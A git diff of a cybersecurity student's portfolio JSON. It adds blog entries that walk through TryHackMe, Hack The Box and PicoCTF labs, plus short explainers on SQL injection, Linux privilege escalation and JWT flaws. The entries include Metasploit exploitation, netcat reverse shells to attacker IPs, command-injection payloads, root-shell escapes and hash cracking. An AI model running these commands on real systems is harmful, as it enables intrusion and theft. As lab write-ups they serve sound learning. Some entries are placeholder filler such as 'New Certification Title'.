@@ -1,24 +1,22 @@
 {
   "adminSettings": {
-    "passcode": "scrypt$0da08a7159e0075191882d7e9f606ef3$3cd29c873852c54ea10b3a21906fe4ec5fc81fa107046c546596fe22017c4d3875ee9a953dcc429e01dee58d405582d43742f31c43ab424e1996893fbe49f73e",
+    "passcode": "",
     "adminEmail": "leonislamofficial123@gmail.com"
   },
   "mainInfo": {
-    "name": "MD Leon Islam",
-    "siteTitle": "LEON",
-    "tagline": "CYBERSECURITY & OFFENSIVE SECURITY ENTHUSIAST",
-    "greeting": "Hi, I'm MD Leon Islam.",
-    "description": "I'm Md Leon Islam, a Computer Science and Engineering student at Patuakhali Science and Technology University (PSTU) (currently in my 5th semester), passionate about cybersecurity, penetration testing, and offensive security. My interests include web application security, network security, vulnerability assessment, and bug bounty hunting.",
     "bio": "CSE student at PSTU and Offensive Security enthusiast",
-    "gmail": "leonislamofficial123@gmail.com",
-    "phone": "+880 1XXXXXXXXX",
-    "role": "Cybersecurity Student",
-    "location": "Patuakhali / Barishal, Bangladesh",
-    "status": "Available for Opportunities",
-    "github": "OxL3on",
-    "image": "/profile.jpg",
     "coverImage": "/china-mountains.jpg",
+    "description": "I'm Md Leon Islam, a Computer Science and Engineering student at Patuakhali Science and Technology University (PSTU) (currently in my 5th semester), passionate about cybersecurity, penetration testing, and offensive security. My interests include web application security, network security, vulnerability assessment, and bug bounty hunting.",
+    "github": "OxL3on",
+    "gmail": "leonislamofficial123@gmail.com",
+    "greeting": "Hi, I'm MD Leon Islam.",
+    "image": "/profile.jpg",
+    "location": "Patuakhali / Barishal, Bangladesh",
     "logoImage": "/logo.png",
+    "name": "MD Leon Islam",
+    "phone": "+880 1XXXXXXXXX",
+    "resumeUrl": "https://facebook.com",
+    "role": "Cybersecurity Student",
     "roles": [
       "Penetration Tester",
       "CTF Player",
@@ -26,8 +24,10 @@
       "Bug Bounty Hunter",
       "Offensive Security Enthusiast"
     ],
-    "resumeUrl": "https://google.com",
-    "updatedAt": "2026-10-17T15:02:58.450Z"
+    "siteTitle": "LEON",
+    "status": "Available for Opportunities",
+    "tagline": "CYBERSECURITY & OFFENSIVE SECURITY ENTHUSIAST",
+    "updatedAt": "2026-10-17T16:40:34.594Z"
   },
   "education": [
     {
@@ -103,23 +103,10 @@
   ],
   "projects": [
     {
-      "id": "proj-1792237013610",
-      "title": "New Security Project",
-      "type": "Security Tool",
-      "date": "2024",
-      "description": "Project description here...",
-      "tags": [
-        "Python",
-        "Security"
-      ],
-      "github": "https://github.com/OxL3on"
-    },
-    {
       "id": "proj-1",
-      "title": "Automated Vulnerability Scanner",
-      "type": "Security Tool",
       "date": "2024",
       "description": "THis is a example project",
+      "github": "https://github.com/OxL3on",
       "tags": [
         "Python",
         "Socket",
@@ -127,14 +114,15 @@
         "CVE Detection",
         "Security"
       ],
-      "github": "https://github.com/OxL3on"
+      "title": "Automated Vulnerability Scanner",
+      "type": "Security Tool",
+      "_id": "6ad39c3fa2573ea0f1e76545"
     },
     {
       "id": "proj-2",
-      "title": "Network Recon & Port Scanner",
-      "type": "Network Security",
       "date": "2024",
       "description": "High-performance network reconnaissance tool with asynchronous service enumeration, TCP/UDP port scanning, and banner grabbing.",
+      "github": "https://github.com/OxL3on",
       "tags": [
         "Python",
         "Networking",
@@ -142,14 +130,15 @@
         "Scapy",
         "Nmap Engine"
       ],
-      "github": "https://github.com/OxL3on"
+      "title": "Network Recon & Port Scanner",
+      "type": "Network Security",
+      "_id": "6ad39c3fa2573ea0f1e76546"
     },
     {
       "id": "proj-4",
-      "title": "Subdomain & Attack Surface Enumerator",
-      "type": "Bug Bounty Tool",
       "date": "2023",
       "description": "Fast asynchronous OSINT reconnaissance script aggregating Certificate Transparency logs and passive DNS records to uncover target attack surfaces.",
+      "github": "https://github.com/OxL3on",
       "tags": [
         "Bash",
         "Python",
@@ -157,10 +146,20 @@
         "Bug Bounty",
         "Automation"
       ],
-      "github": "https://github.com/OxL3on"
+      "title": "Subdomain & Attack Surface Enumerator",
+      "type": "Bug Bounty Tool",
+      "_id": "6ad39c3fa2573ea0f1e76547"
     }
   ],
   "certifications": [
+    {
+      "id": "cert-1792249545477",
+      "title": "New Certification Title",
+      "issuer": "CompTIA / INE / OffSec",
+      "issueDate": "2024",
+      "credentialId": "CERT-123456",
+      "verifyUrl": "https://verify.com"
+    },
     {
       "id": "cert-1",
       "title": "eLearnSecurity Junior Penetration Tester (eJPT)",
@@ -195,6 +194,15 @@
     }
   ],
   "achievements": [
+    {
+      "id": "ach-1792249537690",
+      "title": "New Achievement Title",
+      "type": "Competition",
+      "date": "2024",
+      "rank": "1st Place",
+      "result": "Champion",
+      "description": "Detailed description of the achievement..."
+    },
     {
       "id": "ach-1",
       "title": "Top 1% Rank on TryHackMe",
@@ -251,6 +259,190 @@
     {
       "name": "medium",
       "link": "https://medium.com/@OxL3on"
+    }
+  ],
+  "blogs": [
+    {
+      "slug": "thm-blue-eternalblue",
+      "title": "TryHackMe: Blue (EternalBlue / MS17-010 Walkthrough)",
+      "category": "TryHackMe",
+      "platform": "TryHackMe",
+      "difficulty": "Easy",
+      "date": "Oct 2024",
+      "readTime": "6 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# TryHackMe: Blue (EternalBlue MS17-010 Walkthrough)\n\nA complete practical walkthrough of the **Blue** machine on TryHackMe, demonstrating reconnaissance, vulnerability scanning, and exploitation of the infamous MS17-010 (EternalBlue) SMB flaw.\n\n---\n\n## 1. Nmap Reconnaissance\nWe begin by conducting an aggressive Nmap scan with vulnerability scripts enabled against the target machine:\n\n```bash\nnmap -sV -sC -p- -T4 --script vuln 10.10.x.x\n```\n\nThe scan identifies open SMB ports (139/445) and explicitly confirms:\n```text\nHost script results:\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n```\n\n---\n\n## 2. Exploitation via Metasploit\nWe load the exploit module in `msfconsole`:\n\n```bash\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.x.x\nset LHOST tun0\nrun\n```\n\nWithin seconds, a Meterpreter shell is spawned running with **NT AUTHORITY\\SYSTEM** privileges.\n\n---\n\n## 3. Post Exploitation & Flag Retrieval\n```bash\nmeterpreter > hashdump\nmeterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt\n```\n"
+    },
+    {
+      "slug": "thm-kenobi-samba-suid",
+      "title": "TryHackMe: Kenobi (Samba Exploitation & SUID Path Hijacking)",
+      "category": "TryHackMe",
+      "platform": "TryHackMe",
+      "difficulty": "Easy",
+      "date": "Sep 2024",
+      "readTime": "8 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# TryHackMe: Kenobi (Samba & SUID Path Hijacking)\n\nWalkthrough covering anonymous SMB share enumeration, ProFTPD 1.3.5 `mod_copy` exploit, and escalating privileges using an unquoted SUID binary path hijacking.\n\n---\n\n## 1. SMB & ProFTPD Enumeration\n```bash\nsmbclient -L //10.10.x.x/ -N\n```\nWe locate an open anonymous share containing a user log file mentioning ProFTPD version 1.3.5.\n\nUsing `mod_copy`, we copy Kenobi's private SSH key to the mounted NFS share:\n```bash\nnc 10.10.x.x 21\nSITE CPFR /home/kenobi/.ssh/id_rsa\nSITE CPTO /var/tmp/id_rsa\n```\n\n---\n\n## 2. Privilege Escalation via SUID Path Manipulation\nInspecting SUID binaries:\n```bash\nfind / -perm -u=s -type f 2>/dev/null\n```\nWe observe a custom binary `/usr/bin/menu` running strings command without absolute path (`curl`).\n\n```bash\ncd /tmp\necho \"/bin/sh\" > curl\nchmod 777 curl\nexport PATH=/tmp:$PATH\n/usr/bin/menu\n```\nSelecting the curl option spawns a root shell!\n"
+    },
+    {
+      "slug": "thm-steel-mountain",
+      "title": "TryHackMe: Steel Mountain (Rejetto HTTP Server & Unquoted Service Paths)",
+      "category": "TryHackMe",
+      "platform": "TryHackMe",
+      "difficulty": "Medium",
+      "date": "Aug 2024",
+      "readTime": "9 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# TryHackMe: Steel Mountain Walkthrough\n\nSteel Mountain demonstrates exploiting Rejetto HTTP File Server 2.3 followed by local Windows privilege escalation using PowerUp and unquoted service path abuse.\n\n---\n\n## 1. Initial Access: Rejetto HFS CVE-2014-6287\nAn initial port scan reveals Rejetto HTTP File Server running on port 8080. Using the Python RCE exploit:\n\n```bash\npython3 exploit.py 10.10.x.x 8080 \"nc.exe -e cmd.exe <attacker-ip> 4444\"\n```\n\n---\n\n## 2. Privilege Escalation: Unquoted Service Paths\nRunning PowerUp.ps1:\n```powershell\npowershell -ep bypass -c \". .\\PowerUp.ps1; Invoke-AllChecks\"\n```\nWe find the **AdvancedSystemCareService9** service with an unquoted executable path:\n`C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe`\n\nBy placing a malicious binary at `C:\\Program Files (x86)\\IObit\\Advanced.exe` and restarting the service, our payload executes as LocalSystem.\n"
+    },
+    {
+      "slug": "thm-buffer-overflow-prep",
+      "title": "TryHackMe: Buffer Overflow Prep (OSCP Stack Smashing & Shellcode)",
+      "category": "TryHackMe",
+      "platform": "TryHackMe",
+      "difficulty": "Hard",
+      "date": "Jul 2024",
+      "readTime": "12 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# TryHackMe: Buffer Overflow Prep Walkthrough\n\nA structured guide to x86 32-bit stack-based buffer overflow exploitation: fuzzing, finding the offset, controlling EIP, bad character analysis, finding a JMP ESP instruction, and generating shellcode.\n\n---\n\n## 1. Fuzzing & Crash Reproduction\n```python\nimport socket\n\nbuffer = b\"OVERFLOW1 \" + b\"A\" * 2000\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((\"10.10.x.x\", 1337))\ns.send(buffer)\ns.close()\n```\n\n---\n\n## 2. Finding the Exact EIP Offset\nUsing `msf-pattern_create`:\n```bash\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400\n```\nAfter the crash in Immunity Debugger:\n```text\n!mona findmsp -distance 2400\n```\nEIP offset located at exactly 1978 bytes.\n"
+    },
+    {
+      "slug": "htb-sau-ssrf-maltrail",
+      "title": "Hack The Box: Sau (SSRF via Requests-Baskets to Maltrail v0.54 RCE)",
+      "category": "Hack The Box",
+      "platform": "Hack The Box",
+      "difficulty": "Easy",
+      "date": "Sep 2024",
+      "readTime": "7 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Hack The Box: Sau Walkthrough\n\nSau features a vulnerable instance of Requests-Baskets v1.2.1 exploited via SSRF to access an internal Maltrail service vulnerable to OS Command Injection (CVE-2023-27163).\n\n---\n\n## 1. SSRF via Requests-Baskets (CVE-2023-27163)\nWe configure a proxy basket redirecting internal traffic to `http://127.0.0.1:80/login`.\n\nThis exposes the Maltrail OS monitoring web interface.\n\n---\n\n## 2. Maltrail OS Command Injection\nMaltrail v0.54 contains an unauthenticated OS command injection in the username parameter:\n\n```bash\ncurl 'http://10.10.11.224:55555/proxy-basket' --data 'username=;`id | nc 10.10.14.x 4444`'\n```\nA reverse shell connects back as user `puma`.\n\n---\n\n## 3. Root via systemctl Sudo Misconfiguration\nRunning `sudo -l`:\n`(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`\n\nWe exploit the pager execution inside systemctl:\n```bash\nsudo /usr/bin/systemctl status trail.service\n# Type !sh in the pager to drop into root shell!\n```\n"
+    },
+    {
+      "slug": "htb-lame-samba-rce",
+      "title": "Hack The Box: Lame (Classic Samba usermap script CVE-2007-2447)",
+      "category": "Hack The Box",
+      "platform": "Hack The Box",
+      "difficulty": "Easy",
+      "date": "Aug 2024",
+      "readTime": "5 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Hack The Box: Lame Walkthrough\n\nA retrospective on the classic Lame machine on Hack The Box, exploiting Samba 3.0.20 `usermap script` command execution.\n\n---\n\n## 1. Nmap Scan\n```bash\nnmap -sV -sC -p21,22,139,445 10.10.10.3\n```\nSamba version identified: **Samba 3.0.20-Debian**.\n\n---\n\n## 2. Exploitation\nThe `username map script` option in `smb.conf` executes arbitrary shell commands:\n\n```bash\nlogon \"/=`nohup nc -e /bin/sh 10.10.14.x 4444`\"\n```\nResult: Instant root shell on target!\n"
+    },
+    {
+      "slug": "htb-topology-latex-injection",
+      "title": "Hack The Box: Topology (LaTeX Math Injection to Hash Extraction & Root)",
+      "category": "Hack The Box",
+      "platform": "Hack The Box",
+      "difficulty": "Easy",
+      "date": "Jun 2024",
+      "readTime": "8 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Hack The Box: Topology Walkthrough\n\nTopology features an academic LaTeX rendering engine exploited to read internal files via `\\input`, followed by cron job gnuplot script hijacking for root.\n\n---\n\n## 1. Arbitrary File Read via LaTeX Injection\nOn the math generator page:\n```latex\n$\\lstinputlisting{/var/www/dev/.htpasswd}$\n```\nWe extract the Apache htpasswd hash and crack it with `john`.\n"
+    },
+    {
+      "slug": "picoctf-binary-exploitation",
+      "title": "PicoCTF: Binary Exploitation & Format String Vulnerability Walkthrough",
+      "category": "CTF Writeups",
+      "platform": "CTF",
+      "difficulty": "Medium",
+      "date": "May 2024",
+      "readTime": "7 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# PicoCTF: Format String Vulnerability Walkthrough\n\nA deep dive into format string exploitation (`%x`, `%p`, `%s`, `%n`) to leak memory addresses and overwrite arbitrary pointers in ELF binaries.\n\n---\n\n## 1. Analyzing the Vulnerable Binary\n```c\nint main() {\n    char buf[128];\n    fgets(buf, 128, stdin);\n    printf(buf); // Vulnerable: missing format specifier\n}\n```\n"
+    },
+    {
+      "slug": "cyber-apocalypse-web-challenge",
+      "title": "Cyber Apocalypse CTF: Web Challenge SQLi & WAF Bypass",
+      "category": "CTF Writeups",
+      "platform": "CTF",
+      "difficulty": "Medium",
+      "date": "Apr 2024",
+      "readTime": "8 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Cyber Apocalypse CTF: Web Exploitation Walkthrough\n\nWalkthrough of custom regex filter bypasses and nested JSON SQL injection payloads during Hack The Box Cyber Apocalypse CTF.\n"
+    },
+    {
+      "slug": "knightctf-network-forensics",
+      "title": "KnightCTF: Network Forensics, PCAP Decryption & Packet Carving",
+      "category": "CTF Writeups",
+      "platform": "CTF",
+      "difficulty": "Medium",
+      "date": "Mar 2024",
+      "readTime": "6 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# KnightCTF: Network Forensics & PCAP Analysis\n\nExtracting exfiltrated credentials from TLS streams using Wireshark, TShark, and keylog files.\n"
+    },
+    {
+      "slug": "sql-injection-modern-web-apps",
+      "title": "Deep Dive into Modern SQL Injection and Defense Mechanisms",
+      "category": "Security Research",
+      "platform": "Research",
+      "difficulty": "Advanced",
+      "date": "Oct 2024",
+      "readTime": "7 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Deep Dive into Modern SQL Injection and Defense Mechanisms\n\nSQL Injection (SQLi) remains one of the most persistent and critical security flaws in web applications. Despite parameterized queries being well-known, modern microservices and complex dynamic report builders frequently introduce vulnerable injection surfaces.\n\n![Security Architecture & Threat Vectors](/china-mountains.jpg)\n\n---\n\n## 1. Vulnerability Fundamentals\nSQL Injection occurs when user-supplied input is directly concatenated or unsafely formatted into an active database query without proper validation or parameter binding:\n\n```sql\n-- Vulnerable dynamic query pattern\nSELECT id, username, email FROM accounts \nWHERE username = 'admin' AND password = '' OR '1'='1';\n```\n\nWhen this input is executed by the database engine, the logical condition `'1'='1'` always evaluates to `TRUE`, effectively bypassing authentication checks entirely.\n\n---\n\n## 2. Advanced Attack Vectors\n\n### A. Second-Order SQL Injection\nIn second-order attacks, the malicious payload is stored in the database first (e.g., during profile registration) and later executed unsafely in a different administrative workflow:\n\n```python\n# Attacker registers with a crafted username\nmalicious_user = \"admin'--\"\n\n# Later, an administrative reporting job triggers the stored value unsafely:\ncursor.execute(f\"UPDATE login_logs SET status = 'active' WHERE username = '{malicious_user}'\")\n```\n\n### B. Time-Based Blind Extraction\nWhen an application returns identical HTTP status codes and suppresses error messages, attackers use database sleep functions to extract data character by character:\n\n```sql\n-- PostgreSQL time delay payload for data extraction\nSELECT CASE WHEN (SELECT substring(password, 1, 1) FROM users WHERE username='admin')='a' \n       THEN pg_sleep(5) \n       ELSE pg_sleep(0) END;\n```\n\n---\n\n## 3. Defense & Remediation Matrix\n\nNever trust user-supplied input. Always utilize parameterized queries and prepared statements:\n\n| Mitigation Strategy | Effectiveness | Implementation Details |\n|---|---|---|\n| **Prepared Statements (Parameterized)** | 100% against injection | Database compiles SQL template first, treating inputs strictly as literal values. |\n| **Object-Relational Mapping (ORM)** | High | Use built-in ORM abstractions (Prisma, Hibernate, SQLAlchemy) safely. |\n| **Input Sanitization & Allowlisting** | Defense in Depth | Enforce strict regex validation on user identifiers. |\n\n```javascript\n// Secure parameterized implementation using PostgreSQL in Node.js\nconst query = 'SELECT id, email, role FROM accounts WHERE id = $1';\nconst values = [userId];\nconst result = await pool.query(query, values);\n```\n\n### Summary\nSQL Injection is completely preventable by avoiding raw string concatenation in queries and enforcing prepared statements at every data tier.\n"
+    },
+    {
+      "slug": "linux-privilege-escalation-techniques",
+      "title": "Essential Linux Privilege Escalation Techniques for CTF & Pentesting",
+      "category": "Security Research",
+      "platform": "Research",
+      "difficulty": "Intermediate",
+      "date": "Sep 2024",
+      "readTime": "10 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Essential Linux Privilege Escalation Techniques for CTF & Pentesting\n\nGaining an initial foothold via a reverse shell is only the first step. Privilege escalation (PrivEsc) is the methodology used to elevate from low-privileged user access to `root`.\n\n![Terminal and Offensive Security Tools](/profile.jpg)\n\n---\n\n## 1. Initial Reconnaissance & Enumeration\nBefore running automated scripts, execute basic manual enumeration commands to understand system privileges:\n\n```bash\n# Check current user and groups\nid\nwhoami\n\n# List sudo privileges without requiring password\nsudo -l\n\n# Check Linux kernel and distribution release\nuname -a\ncat /etc/os-release\n```\n\n---\n\n## 2. Abusing SUID / SGID Binaries\nFiles with the SUID (Set User ID) bit set execute with the file owner's permissions, typically `root`.\n\nTo discover all SUID binaries across the filesystem:\n```bash\nfind / -perm -u=s -type f 2>/dev/null\n```\n\nLook out for uncommon or custom binaries or GTFOBins staples such as `vim`, `nmap`, `bash`, or `find`:\n\n```bash\n# Example: Escaping through SUID find\nfind . -exec /bin/sh -p \\; -quit\n```\n\n---\n\n## 3. Vulnerable Sudo Permissions (GTFOBins)\nIf `sudo -l` reveals permissions like `(root) NOPASSWD: /usr/bin/python3`, you can immediately spawn a root shell:\n\n```bash\nsudo python3 -c 'import os; os.system(\"/bin/bash\")'\n```\n\nAlways check [GTFOBins](https://gtfobins.github.io) for verified bypasses against binary binaries.\n"
+    },
+    {
+      "slug": "api-security-jwt-vulnerabilities",
+      "title": "Breaking and Securing JSON Web Tokens (JWT) in REST APIs",
+      "category": "Security Research",
+      "platform": "Research",
+      "difficulty": "Intermediate",
+      "date": "Aug 2024",
+      "readTime": "6 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# Breaking and Securing JSON Web Tokens (JWT) in REST APIs\n\nJSON Web Tokens (JWT) are widely adopted for stateless authentication in modern web APIs. However, improper signature verification and algorithmic confusion often introduce severe authentication bypasses.\n\n---\n\n## 1. JWT Structure Breakdown\nA standard JSON Web Token consists of three base64url-encoded parts separated by periods:\n1. **Header**: Contains token type and signing algorithm (`{\"alg\": \"HS256\", \"typ\": \"JWT\"}`)\n2. **Payload**: Contains session claims and user metadata (`{\"sub\": \"1234\", \"role\": \"user\"}`)\n3. **Signature**: Cryptographic proof guaranteeing integrity\n\n---\n\n## 2. Classic Flaws & Exploits\n\n### A. The \"None\" Algorithm Flaw\nSome outdated libraries accept tokens signed with `\"alg\": \"none\"`, completely ignoring signature verification:\n\n```python\n# Header payload with none algorithm\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\n```\nBy stripping the signature and changing `\"role\": \"admin\"`, an attacker can gain unauthorized administrative privileges.\n\n### B. Weak HMAC Secrets\nWhen tokens are signed using `HS256` with short or dictionary secrets, tools like `hashcat` or `jwt-tool` can brute-force the secret key offline in minutes:\n\n```bash\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n```\n\n---\n\n## 3. Remediation Checklist\n- Always enforce explicit algorithm whitelisting on the verification server.\n- Use strong, asymmetric keys (`RS256` or `EdDSA`) with at least 2048-bit length.\n- Never rely on the client-specified `alg` header to determine the verification logic.\n"
+    },
+    {
+      "slug": "recon-methodology-bug-bounty",
+      "title": "My Reconnaissance Methodology for Bug Bounty Hunting",
+      "category": "Security Research",
+      "platform": "Research",
+      "difficulty": "Intermediate",
+      "date": "Jul 2024",
+      "readTime": "8 min read",
+      "author": "MD Leon Islam",
+      "github": "https://github.com/OxL3on",
+      "medium": "https://medium.com/@OxL3on",
+      "content": "# My Reconnaissance Methodology for Bug Bounty Hunting\n\nIn bug bounty programs with wide scopes (`*.target.com`), quality reconnaissance accounts for over 80% of finding novel bugs before other hunters.\n\n---\n\n## 1. Asset Discovery Pipeline\n\n1. **Subdomain Enumeration**:\n   - Passive sources: Certificate Transparency logs (crt.sh), VirusTotal, SecurityTrails.\n   - Active brute-forcing with `shuffledns` or `massdns`.\n\n2. **Port Probing & Service Discovery**:\n   ```bash\n   # Probe alive HTTP/HTTPS services\n   cat subdomains.txt | httpx -silent -title -status-code -tech-detect\n   ```\n\n3. **JavaScript Endpoint Analysis**:\n   - Extract hidden API routes and token leaks using `katana` and `gau`.\n"
     }
   ]
 }
